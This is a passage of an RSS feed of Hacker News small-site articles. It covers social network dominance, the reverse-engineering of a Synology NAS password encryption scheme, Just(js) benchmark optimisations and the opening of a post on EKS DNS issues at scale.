subject.&nbsp; Just by the amount of clout that FB has due to the number of other sites linking to it in the world, and the speed at which the site loads, on top of the fact that the parts that are exposed are also designed to be optimized for a search engine means that any new potential visitor is most likely going to land on that site.</p><p>So by therefor all new internet users end up visiting some of the major authorities on the internet that basically made it easier for humans to be able to post and publish things, ie becoming an indeterminate.&nbsp; </p><p>And since humans are far more creative in collective than any one human can be, by being the source of where people can publish things for sale, or thoughts, it by algorithmic process leads to the situation we are in.&nbsp; Of course there are ways to get around this, but that's not for today.<br></p>
      
       <p>P.S. Subscribe to my <a href="https://johnathannader.com/newsletter/">newsletter</a> and follow me on <a href="https://twitter.com/nadermx" rel="nofollow noopener" target="_blank">twitter</a></p>
      </div>
    

    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://johnathannader.com/why-some-these-social-networks-are-so-hard-beat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201808</guid>
            <pubDate>Sat, 20 Feb 2021 05:16:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What on Earth is this Encryption Scheme?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26201723">thread link</a>) | @soopurman
<br/>
February 19, 2021 | https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ | <a href="https://web.archive.org/web/*/https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody" id="content"><p>I have taken a couple terabytes of photos over the years, and have a mild phobia of deleting data, so I keep my photos on a <a href="https://www.synology.com/en-global">Synology DiskStation NAS</a>. I‚Äôve got all the files on the thing:</p><ul><li>backed up to the cloud</li><li>encrypted,</li></ul><p>because back in 2016, my <a href="https://www.instagram.com/p/BMpgY9zAGbD/">apartment was broken into and thieves took all the electronics</a>. I‚Äôve been slightly paranoid ever since.</p><p>The Synology NAS generally works pretty well, but the interface for decrypting a drive after booting is <em>extremely</em> painful. It‚Äôs about 10 clicks, a username, two different passwords, and a UI that is kinda wonky (it‚Äôs a desktop in a web browser)? Here‚Äôs a screengrab:</p><figure><video alt="Unlocking an encrypted drive in the Synology DiskStation UI" src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/decrypt.mp4" width="588" muted="" autoplay="" loop="" playsinline=""></video><figcaption><p>22 seconds is my personal speed record.</p></figcaption></figure><p>There are alternative solutions to this ‚Äì you can set it up so that it <a href="https://www.synology.com/en-au/knowledgebase/DSM/tutorial/File_Sharing/How_to_encrypt_and_decrypt_shared_folders_on_my_Synology_NAS#t4_1">reads the encryption key from a USB disk on startup, for example</a> ‚Äì but, if I‚Äôm worried about the whole thing being stolen, it‚Äôs not a good idea to leave the encryption keys plugged into the thing, and it‚Äôs also not a nice UX to find and plug in a USB before turning the thing on.</p><p>This‚Ä¶ seems kinda silly to me, and something that should be solvable with ‚ú® <em>technology</em> ‚ú®. I‚Äôm only ever accessing this from one computer, for example, and every modern operating system has a good credential storage system (think <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac"><em>Keychain Access</em></a> on OSX or <a href="https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0"><em>Credential Manager</em></a> on Windows 10). So, maybe my computer could take care of supplying encryption keys to the DiskStation!</p><p>I went looking for options, and discovered that the DiskStation Software has a <a href="https://global.download.synology.com/download/Document/Software/DeveloperGuide/Package/FileStation/All/enu/Synology_File_Station_API_Guide.pdf">publicly-documented web API (pdf)</a>. At least, a <em>mostly</em> publicly documented web API ‚Äì there‚Äôs no documentation for the methods to mount and unmount encrypted shares.</p><p>That web API is <em>also</em> used by the desktop software though! So it should theoretically be possible to use <a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">browser devtools</a> to see exactly <em>what</em> is being sent to the DiskStation. ü§î</p><p>So, I clicked on all the right things in the Web UI, got to the bit where you type in the password, opened the devtools to the ‚ÄúNetwork Requests‚Äù tab, typed in <code>abc123</code> as my password, hit ‚Äúsend‚Äù and then watched for the requests:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/encryption-dot-cgi.png" alt="Firefox devtools screenshot, showing a request to an ominously-named 'encryption.cgi'"><figcaption><p>hmmmmmmmmmmm</p></figcaption></figure><p>Hmmm, that <code>encryption.cgi</code> looks a little ominous. I wonder what‚Äôs in it?</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/public-key.png" alt="Firefox devtools screenshot, showing huge blob of base16-encoded public-key"><figcaption><p>Yep, looks like encryption, alright</p></figcaption></figure><p>Ok, a public key. And then the web interface loads a spinner, and makes a request to <code>entry.cgi</code>. Let‚Äôs take a look at the contents of that request:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ciphertext.png" alt="A devtools screenshot, showing a jumbled blob of base64-encoded data with the phrases 'rsa' and 'aes' sprinkled throughout."><figcaption><p>HMMMMMMMMMMMMMMMM</p></figcaption></figure><p>Ok, so if we want to send a magic request to mount the encrypted share, it‚Äôs not going to be enough to supply the encryption password; we‚Äôre also going to need to figure out how to <em>correctly</em> supply it ‚Äì how to <em>encrypt</em> the encryption password, so to speak.</p><h2 id="so-what-is-this-crypto-system">So, what is this crypto system?</h2><p>Right. Here‚Äôs a high-level overview:</p><ul><li>First, we fetch the <code>public_key</code> from the server. That‚Äôs the call to the <code>encryption.cgi</code> endpoint we saw earlier. This isn‚Äôt actually the entire public key, it‚Äôs only <em>part</em> of it. In fact, this is a 4096-bit integer, encoded in base-16. The <em>other</em> part of the public key is the number <code>0x10001 == 65537</code>, which is hardcoded into the JavaScript.</li><li>Then, we generate 501 bytes worth of random text from the charset <code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+-/</code> (that‚Äôs 77 different possible characters; I have no idea why this set was chosen though!).</li><li>We encrypt that random text using our public key. The encryption method is <a href="https://tools.ietf.org/html/rfc3447#section-7.2">RSA with PKCS1.5 padding</a>.</li><li>We MD5-hash that random text a bunch of times with an 8-byte salt. The end result of this is 48 bytes which certainly <em>look</em> pretty random to the naked eye.</li><li>We split those 48 bytes into two components ‚Äì a 32-byte (== 256-bit) key, and a 16-byte initialisation vector.</li><li>Remember the password we typed in? Yeah, I‚Äôd forgotten about it too! But now, we <em>finally</em> take that password, and encrypt it with AES in Cipher Block Chaining (CBC) mode with PKCSv7 padding, using the 256-bit key and 16-byte IV we derived in the previous step.</li><li>We bundle the RSA ciphertext, the 8-byte salt, and the AES ciphertext together and ship them across to the DiskStation.</li></ul><p>Still with me? It‚Äôs ok if that didn‚Äôt all make loads of sense yet; we‚Äôll now go over the interesting bits more closely.</p><h3 id="symmetric--asymmetric-ciphers">Symmetric / Asymmetric Ciphers</h3><p>Fundamentally, we‚Äôre using two cryptographic algorithms in concert:</p><ul><li><strong>RSA</strong>: RSA is an <em>asymmetric</em> cryptographic algorithm. Asymmetric cryptographic systems have two <em>keys</em> ‚Äì a public key, which allows only for encryption of the data, and a private key, which allows for both encryption <em>and</em> decryption.</li><li><strong>AES</strong>: AES is a <em>symmetric</em> cryptographic algorithm. In symmetric cryptography, all parties have the same key, and that key allows you to both encrypt and decrypt.</li></ul><p>It seems weird that we‚Äôre using both of these at the same time, right? But both systems have weaknesses, and mixing them together is an attempt at minimising the disadvantages of both schemes.</p><p>The problem with <em>symmetric</em> crypto systems by themselves is that you need a way to get that one key to every party that needs it. But you can‚Äôt just <em>send</em> it to them, because you don‚Äôt have a secure channel yet! Your options are:</p><ul><li>Share the key over a different trusted channel beforehand, or</li><li>have both parties derive the same shared key (from e.g. some partial data that they negotiate over the wire beforehand).</li></ul><p>Asymmetric crypto doesn‚Äôt have this problem ‚Äì if you‚Äôre able to share a key that can only be used for encrypting and not for decrypting, then the decryption keys never have to leave the recipient machine. You can then encrypt some text, and nobody except for the recipient can decrypt it ‚Äì not even you! Put it on the internet, write it on a banner attached to the back of a propeller plane ‚Äì the message will only be readable by the intended recipient.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/your-ciphertext-here.jpg" alt="A propeller plane with a banner reading 'your ciphertext here'"></figure><p>Asymmetric cryptography is <em>slow</em>, though, so doing it for lots of data is going to really hurt performance.</p><p>A common solution is to simply <em>make up</em> a symmetric key, perform some symmetric encryption using that key, then encrypt <em>that</em> key using asymmetric cryptography, and deliver both to the remote party. Then, the remote party can:</p><ul><li>First, perform asymmetric decryption to obtain the symmetric key</li><li>Then, use that symmetric key to decrypt the rest.</li></ul><p>That‚Äôs what <em>this</em> particular system is doing. ‚ú®</p><h3 id="a-quick-note-about-rsa">A quick note about RSA</h3><p>I don‚Äôt know much about how RSA works, but as part of researching this article I discovered that it‚Äôs pretty easy to implement badly, and <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">extremely difficult to implement well</a>.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/rsa-correct.gif" alt="Two developers correctly implement RSA, 2010, colorised"><figcaption><p><a href="https://www.youtube.com/watch?v=vPwzHm6buB8">Two developers correctly implement RSA</a>, 2010, colorised</p></figcaption></figure><p>As software developers, we spend a lot of time shipping things once they get to a point of ‚Äúit looks like it works‚Äù. <strong>You can‚Äôt take that approach with cryptography</strong>, and because everything is so opaque, it‚Äôs a lot easier to declare that your implementation works without realising that it‚Äôs missing fundamentals. Like correctness, for example.</p><h3 id="lets-talk-about-random-keyslets-talk-about-you-and-me">Let‚Äôs talk about random keys<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></h3><p>Recall that this algorithm is generating 501 random bytes from a 77-character set, and encrypting that with RSA. 501 seemed like an oddly specific number to me; here‚Äôs the specific set of circumstances that characterise <em>why</em> we‚Äôre generating a string of this length.</p><p>RSA is a <a href="https://en.wikipedia.org/wiki/Block_cipher"><em>block cipher</em></a>, which means it operates on distinct fixed-size blocks of input and produces fixed-size blocks of output. How big can each block be? Well, RSA public keys are made up of two numbers: a (very large) modulus <code>n</code>, and a much smaller exponent <code>e</code>. RSA is capable of encrypting any message that‚Äôs smaller than <code>n</code> if you convert it to a number. In our case, we said that our modulus was a seemingly-random 4096-bit integer ‚Äì that means (approximately) that we can encrypt 512-byte blocks.</p><p>There‚Äôs an important implication here: if you don‚Äôt have enough input for a block, you need to fill it up somehow. Normally this is called a <em>padding scheme</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> in block-based cryptography.</p><p>Now, the system on this NAS in particular uses <a href="https://tools.ietf.org/html/rfc3447#section-7.2.1">PKCS1-v1.5 padding</a>, which prepends the message (before encryption) with 3 bytes of headers <em>plus</em> a minimum of 8 bytes<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> of random garbage. That makes 11 bytes out of a 512 byte block, which means we‚Äôve got‚Ä¶ 501 bytes left for our message. ‚ú®</p><h3 id="lo-fi-key-derivation">Lo-fi key derivation</h3><p>So‚Ä¶ we‚Äôve got this 501-byte string, with each character being one of 77 possibilities, and we think we know <em>why</em> it was chosen to be 501 bytes long. But that‚Äôs not going to work for AES-encrypting the password:</p><ul><li>AES requires a key size of 128, 192, or 256 bits. That‚Äôs 16, 24, or 32 bytes respectively, but we‚Äôve got <em>lots</em> more than that.</li><li>We can‚Äôt, however, just take a subset of bytes from the text and go from there ‚Äì because they‚Äôre selected from a narrow subset of possible bytes (77 out of 255!), you‚Äôd be losing an <em>enormous</em> amount of entropy in the key, making the encrypted text about 44,000,000,000,000,000 times<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> easier to break.</li></ul><p>These constraints need to be managed. We can smooth over both by applying a <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a>, based on repeated rounds of MD5 hashing and concatenating. Hash algorithms, in general, are good for this because they map input data to‚Ä¶ not random, but random-<em>looking</em> output data.</p><p>I like to think of hashing as ‚Äúentropy laundering‚Äù ‚Äì if you‚Äôve got 256 bits of entropy in a 16kB file, taking the first 256 bits will give you only 64 bits of entropy. If you hash the whole 16kB file, then the entropy goes back up to the maximum of the entropy in the file and the entropy provided by the hash algorithm. This works because hash algorithms are designed to exhibit an <a href="https://en.wikipedia.org/wiki/Avalanche_effect">avalanche effect</a>.</p><p>I do <em>not</em> have the tools or experience to evaluate whether this specific scheme is secure or not (this one seems esoteric, and the <a href="https://security.stackexchange.com/questions/19906/is-md5-considered-insecure">use of MD5 is scary</a>!)‚Ä¶ so let‚Äôs move briskly on.</p><h3 id="aes-encryption">AES-encryption</h3><p>Finally, after a bunch of outdated and somewhat esoteric primitives, we‚Äôre back to something that is <em>good</em> and <em>works</em> and <em>only slightly</em> a <a href="https://en.wiktionary.org/wiki/footgun">loaded footgun</a> and is <em>still recommended for widespread use!</em> It‚Äôs AES with a 256-bit key.</p><p>AES is our symmetric cipher. Like RSA, it operates on blocks of fixed length. <a href="https://crypto.stackexchange.com/questions/66314/whats-the-best-block-cipher-mode-of-operation-for-rsa/66321#66321">Unlike RSA</a>, these blocks can be chained together. The strategies to do this are called <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">‚ÄúBlock cipher modes of operation‚Äù</a>, and AES implementations ship with a number of them. The problem is, this means you have access ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/">https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/</a></em></p>]]>
            </description>
            <link>https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201723</guid>
            <pubDate>Sat, 20 Feb 2021 05:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On JavaScript Performance]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26201585">thread link</a>) | @anoopsie
<br/>
February 19, 2021 | https://just.billywhizz.io/blog/on-javascript-performance-01/ | <a href="https://web.archive.org/web/*/https://just.billywhizz.io/blog/on-javascript-performance-01/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2>Why is Javascript in the top 2 of techempower?</h2>
<p>This question was recently <a target="_blank" rel="noopener" href="https://github.com/justjs/just/issues/5">asked</a> on github, prompted by the <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">arrival</a> of a new javascript platform near the summit of the intermediate <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=intro">techempower</a> rankings. This platform, Just(js), is something I have been hacking on as a side-project for some time now. Here I will attempt to give a brief answer to the question and will be following up with some further detail on this and the platform itself over the coming weeks.</p>
<p>If you find yourself getting hot under the collar reading this, please check the <a href="#caveats">caveats</a> below before going any further.</p>
<h2>What are the Techempower Rankings?</h2>
<p>The techempower rankings have been running since 2013 and have become a very useful tool for a number of reasons.</p>
<ul>
<li>It's a great place to get a good overview of the various frameworks available in different languages and on different platforms.</li>
<li>It covers a pretty good range of basic tasks any web service is going to need to perform. There are definitely some big gaps but the folks at techempower have plans to develop it further.</li>
<li>It gives some useful insight into where the relative strengths and weaknesses of various platforms and languages lie.</li>
<li>It is having an effect in highlighting weaknesses and driving efforts in many of these frameworks to improve performance. It shows consistent improvement in the average performance of the competing frameworks. While all such competitions should be taken with a large grain of salt, they do have an effect in <a target="_blank" rel="noopener" href="https://benediktmeurer.de/2016/12/16/the-truth-about-traditional-javascript-benchmarks/">driving efficiences</a>. The combined score of the top 5 frameworks has improved by 62% from 24k in <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=data-r16">round 16</a> to 39k in <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=data-r19">round 19</a> and it currently stands at 48k in the <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">latest</a> intermediate round.</li>
</ul>
<h2>What is Just(js)?</h2>
<p><a target="_blank" rel="noopener" href="https://github.com/just-js">Just(js)</a> is a small, simple and hopefully efficient javascript server side framework built on top of the <a target="_blank" rel="noopener" href="https://v8.dev/">google v8</a> javascript engine. Currently it supports modern linux on x86_64 only. It is still quite a way from a stable beta but I am not expecting any big changes to functionality and the code base is very small (approx 5k lines of c++ and javascript) so it should not be a huge amount of work to bring it to some kind of stable state.</p>
<p>I will go into more detail in future posts on the rationale and motivations behind it but for now I can say the main goals are to:</p>
<ul>
<li>have a small codebase and as few source files as possible (i.e. reduce the cognitive load)</li>
<li>favour c-style function calls over complex OO structures</li>
<li>be efficient in execution and memory usage</li>
<li>be single platform only, which means the code is easier to understand without lots of macros and #ifdefs everywhere</li>
<li>be easy to understand and hack on for anyone with some basic knowledge of c/c++ and linux system api's</li>
<li>be a useful platform for learning more about the v8 engine and linux system apis</li>
<li>be easy to extend and customise for embedders</li>
<li>demonstrate that javascript can be a valid choice for building high performance system level software and network servers</li>
</ul>
<h2>Just Show Me The Results Already!</h2>
<p>Okay, Okay! Here are the top 10 frameworks from the latest techempower intermediate run. Please read the <a href="#caveats">caveats</a> to understand why these results should be taken with a little skepticism for now.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/header.png"><img width="605" height="340" src="https://just.billywhizz.io/blog/on-javascript-performance-01/header.png" alt="Intermediate Results Top 10"></a></p>
<p>
Intermediate Results Top 10
</p>
<p>You can see the full results <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">here</a>.</p>
<p>There are a few things we can note:</p>
<ul>
<li>The top rankings are dominated by C++ and Rust frameworks, which is to be expected.</li>
<li>Just(js) squeezes in just behind the top performing <a target="_blank" rel="noopener" href="https://github.com/matt-42/lithium">C++ framework</a> achieving 95% of its composite score and 4% ahead of the <a target="_blank" rel="noopener" href="https://github.com/an-tao/drogon">next best</a> performing C++ framework.</li>
<li>Just(js) scores 10% and 13% better than the top performing <a target="_blank" rel="noopener" href="https://github.com/ntex-rs/ntex">Rust</a> <a target="_blank" rel="noopener" href="https://github.com/actix/actix">frameworks</a></li>
<li>In comparison to other "high level" languages, Just(js) scores 32% higher than the best performing <a target="_blank" rel="noopener" href="https://github.com/aspnet">C#/.Net</a> and <a target="_blank" rel="noopener" href="https://jooby.io/">Java</a> frameworks.</li>
<li>Just(js) scores 40% higher than the best performing <a target="_blank" rel="noopener" href="https://github.com/gofiber/fiber">Go framework</a>.</li>
</ul>
<p>When comparing to other Javascript frameworks the difference becomes quite stark.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/js-frameworks.png"><img width="1132" height="218" src="https://just.billywhizz.io/blog/on-javascript-performance-01/js-frameworks.png" alt="Intermediate Results Javascript Frameworks"></a></p>
<p>
Results for Javascript Frameworks
</p>
<ul>
<li>Just(js) scores 2x higher than the next best performing Javascript framework, <a target="_blank" rel="noopener" href="https://github.com/reactiverse/es4x">es4x</a> which is based on Vert.x and the JVM.</li>
<li>It scores 5x-6x higher than the <a target="_blank" rel="noopener" href="https://github.com/lukeed/polkadot">best</a> Node.js based Javascript <a target="_blank" rel="noopener" href="https://www.fastify.io/">frameworks</a>.</li>
</ul>
<h2>How Does Just(js) Achieve These Scores?</h2>
<p>Well, it was <em>a lot</em> of hard work. My initial attempts, which I benchmarked on my laptop against the best C++, Rust and Javascript frameworks were so-so.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/initial.png"><img width="562" height="331" src="https://just.billywhizz.io/blog/on-javascript-performance-01/initial.png" alt="Initial Tests"></a></p>
<p>
Results of Inital Local Tests
</p>
<p>I was only seeing 50% of the best performers, with particularly bad scores for the multi-query, update and fortunes tests, which are the most relevant ones to real-world scenarios.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/initial-detail.png"><img width="944" height="123" src="https://just.billywhizz.io/blog/on-javascript-performance-01/initial-detail.png" alt="Initial Tests Detail"></a></p>
<p>
Detail of Initial Local Tests
</p>
<p>I wasn't too disappointed by that and still had plenty of room for optimizations and a strong instinct that big improvements could be made, so I set to work.</p>
<h3>Postgres API</h3>
<p>My initial attempt was using a <a target="_blank" rel="noopener" href="https://github.com/just-js/modules/tree/0.0.5/pg">C++ module</a> interfacing with the official <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/current/libpq.html">libpq</a> c api. I did a lot of testing and traffic analysis against this and came up against bottlenecks I could not explain so decided to abandon it and try to write a Javascript library to interface with Postgres instead. I later discovered (by examining the source code of the other frameworks) that there is <a target="_blank" rel="noopener" href="https://www.postgresql.org/message-id/attachment/112272/v18-0001-libpq-batch-support.patch">a patchset</a> for libpq which resolves these issues so I may revisit the C++ binding in the future.</p>
<p>After a number of days poring over the postgres docs and testing, I was happy with the surprisingly good results I was seeing from the <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/pg.js">Javascript code</a> i put together. I had to work hard to ensure I was doing as few heap allocations as possible and implemented many optimizations like being able to <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/connection.js#L138">pre-compile</a> the queries into ArrayBuffers and using prepared statements in Postgres, which is much faster than doing raw Sql queries.</p>
<p>Here is a little snippet of How the pre-compiled queries work:</p>
<pre><code>
sock.allFortunes = await compile(sock, {
  formats: [],
  sql: 'select * from Fortune',
  fields: [{ format: 1, oid: INT4OID }, { format: 0, oid: VARCHAROID }],
  name: 's2',
  portal: '',
  maxRows: 0,
  htmlEscape: true,
  params: []
})
</code>
</pre>
<p>and how this is called:</p>
<pre><code>
const { allFortunes } = sock

allFortunes.call(() =&gt; {
  const html = getHTML(insertionSort([extra, ...allFortunes.getRows()]))
  sock.writeString(`${rHTML}${utf8Length(html)}${END}${html}`)
})
</code>
</pre>
<h3>Micro Optimisations</h3>
<p>I also added some further optimizations which allowed me to squeeze out a few more drops of performance:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/just-js/modules/blob/0.0.5/picohttp/http.cc">Using</a> <a target="_blank" rel="noopener" href="https://github.com/h2o/picohttpparser">picohttpparser</a> which takes advantage of SSE4 instructions for blazing fast http parsing.</li>
<li>Using <a target="_blank" rel="noopener" href="https://github.com/lucagez/slow-json-stringify">slow-json-stringify</a> instead of native JSON.stringify made a small but noticeable difference across the board.</li>
<li>Doing the HTML escaping <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/connection.js#L238">at the same time</a> as reading the strings from the ArrayBuffers coming back from Postgres made quite a difference in the Fortunes test. Strings are allocated on the v8 heap and if they are short lived they have to be garbage collected which hurts performance quite a lot. I admit escaping the string at the database driver level is a little bit of a cheat so I will likely revisit this when I have some time.</li>
<li>I noticed that other frameworks were using single queries to do the updates rather than a query for each update and adopted this approach too. You can see what that looks like <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L45">here</a>.</li>
<li>I was unable to find a fast enough html templating library for the Fortunes test so need to do some further work to come up with an optimal solution for that. For now, the html is <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L175">being built manually</a> which is again a little bit of a cheat, but I am confident I can find something that works and provides equivalent performance.</li>
<li>Because the resultsets for the Fortunes test are small I found a simple <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L188">insertion sort</a> was quicker than the out of the box Array.sort in Javascript/v8.</li>
</ul>
<h2>Techempower Environment</h2>
<p>Techempower run <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=environment">the tests</a> on 3 Dell R440 servers, each of which has an Intel Xeon Gold 5120 CPU with 28 threads and a dedicated Cisco 10Gbps ethernet adapter.</p>
<p>The framework being tested runs on one machine, the database on another and the benchmarking tool (which uses <a target="_blank" rel="noopener" href="https://github.com/wg/wrk">wrk</a>) runs on the third. Everything runs inside of docker using Host networking so the overhead from that should be minimal.</p>
<h2>Initial Submission</h2>
<p>Having done all this work, I was now seeing Just(js) match the top performing frameworks on my local tests so was reasonably confident I could score well in the production techempower environment.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/local-final.png"><img width="543" height="314" src="https://just.billywhizz.io/blog/on-javascript-performance-01/local-final.png" alt="Final Results of Local Tests"></a></p>
<p>
Final Results of Local Tests
</p>
<p>I submitted my pull request, had it reviewed and accepted and then waited anxiously while the techempower servers churned through the tests. The total run takes about 5 days each time so I was hugely disappointed when my initial submission failed on the production run. This was down to DNS working differently in the production environment than it does in techempower's CI system and my code not handling this correctly.</p>
<p>I made <a target="_blank" rel="noopener" href="https://github.com/TechEmpower/FrameworkBenchmarks/pull/5998/files#diff-8ea032b8acd0d08eacd31ec942cbde8316c4f868c29551ef758f3a889f5df23a">some changes</a> to the dns code to use /etc/resolv.conf and /etc/hosts to determine the IP address of the database once I realised the production environment was using the <b>--add-host</b> docker option to inject the database IP address into the container /etc/hosts file.</p>
<p>Thankfully, after some more anxious waiting, the tests were successful next time around but I was a little disappointed to see Just(js) had only <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=8ee18501-8947-4847-9449-f8b5dde1ba2d&amp;hw=ph&amp;test=composite&amp;a=2">placed 5th</a> overall, scoring roughly 70% of the best performing framework.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/techempower-first.png"><img width="1084" height="131" src="https://just.billywhizz.io/blog/on-javascript-performance-01/techempower-first.png" alt="Initial Techempower Result"></a></p>
<p>
Results of Initial Run on Techempower
</p>
<p>After my intial disappointment, I decided this was actually quite a respectable score, with only lower level Rust and C++ frameworks scoring higher, so I took a break for a few days and pondered what could be causing the discrepancy between my local tests and the ones in the production environment.</p>
<p>With my batteries recharged, I decided to rent some time on a similarly specced server from <a target="_blank" rel="noopener" href="https://www.packet.com/">Packet.com</a> (now Equinix Metal) to see if i could reproduce the issue in a similar environment. After a lot of perf and strace investigation I noticed that there was a huge amount of system call overhead. This was being dominated by calls to pthread_mutex_lock and pthread_mutex_unlock, so I decided to dig into the v8 code to see what could be causing this.</p>
<p>I eventually tracked the issue down to <a target="_blank" rel="noopener" href="https://github.com/v8/v8/blob/8.5.210/src/heap/array-buffer-tracker-inl.h#L75">this code</a>. It seems that every time we call ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://just.billywhizz.io/blog/on-javascript-performance-01/">https://just.billywhizz.io/blog/on-javascript-performance-01/</a></em></p>]]>
            </description>
            <link>https://just.billywhizz.io/blog/on-javascript-performance-01/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201585</guid>
            <pubDate>Sat, 20 Feb 2021 04:25:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing EKS DNS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26201292">thread link</a>) | @mooreds
<br/>
February 19, 2021 | https://www.vladionescu.me/posts/eks-dns/ | <a href="https://web.archive.org/web/*/https://www.vladionescu.me/posts/eks-dns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Got to blog on the AWS Containers Blog: <a href="https://aws.amazon.com/blogs/containers/eks-dns-at-scale-and-spikeiness/">EKS DNS at scale and spikeiness</a>! üéâ</p>
<p>I usually just get to mentor people, and they get to post stuff publicly, so this is a nice change!</p>
<hr>
<blockquote>
<p>The AWS Containers Blog now <a href="https://github.com/aws/containers-roadmap/issues/303">seems to be missing my blog post</a>, so here‚Äôs a copy:</p>
</blockquote>
<h2 id="eks-dns-at-scale-and-spikeiness">EKS DNS at scale and spikeiness</h2>
<p><em>This is a guest post by&nbsp;Vlad Ionescu for Ownzones.</em></p>
<p>In his post we will discuss the issue of DNS errors at scale, that is, several hundreds to thousands of nodes, showing how the problems can be mitigated. This was an obstacle that affected Ownzones for several months and a problem that we expect everybody at scale will encounter. Two solutions will be proposed and their implementation will be discussed. Troubleshooting steps are shared for easy identification of the problem.</p>
<p>Ownzones is a pioneering technological force that‚Äôs transforming the OTT industry with ground-breaking innovations. Our product Ownzones Connect is a cloud-native platform, which leverages our proprietary technology as well as the best tools in the industry to provide studios an agile, low-cost solution for global distribution and localization. Some of the key features include the world‚Äôs first fully cloud-based, parallel processing IMF transcoder.</p>
<h3 id="problem">Problem</h3>
<p>At Ownzones, we run our applications in containers for increased developer velocity. Due to rather intense scaling requirements ‚Äî a multi-TB movie comes in and needs to be processed as soon as possible ‚Äî the decision was made to use Kubernetes for container orchestration. Since we are running in AWS, we make use of the amazing <a href="https://aws.amazon.com/eks/">Amazon Elastic Kubernetes Service</a> or EKS for short. We leverage other AWS services such as <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a>, <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>, and more. We manage all the services and infrastructure configuration in code with <a href="https://www.terraform.io/">Terraform</a> and we practice gitops with <a href="https://www.runatlantis.io/">Atlantis</a>.</p>
